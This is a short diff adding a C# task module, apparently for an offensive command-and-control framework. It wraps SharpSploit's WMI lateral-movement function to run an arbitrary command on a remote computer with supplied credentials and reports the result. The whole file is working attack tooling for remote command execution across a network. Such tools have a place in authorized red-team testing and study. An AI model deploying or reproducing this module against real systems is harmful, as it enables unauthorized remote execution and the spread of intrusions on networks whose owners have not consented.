@@ -1,0 +1,18 @@
+﻿using System;
+
+using SharpSploit.LateralMovement;
+
+public static class Task
+{
+    public static string Execute(string ComputerName, string Username, string Password, string Command)
+    {
+        if (WMI.WMIExecute(ComputerName, Command, Username, Password))
+        {
+            return "WMI execution successful. Executed: \"" + Command + "\" on: " + ComputerName + " as: " + Username;
+        }
+        else
+        {
+            return "WMI execution failed.";
+        }
+    }
+}
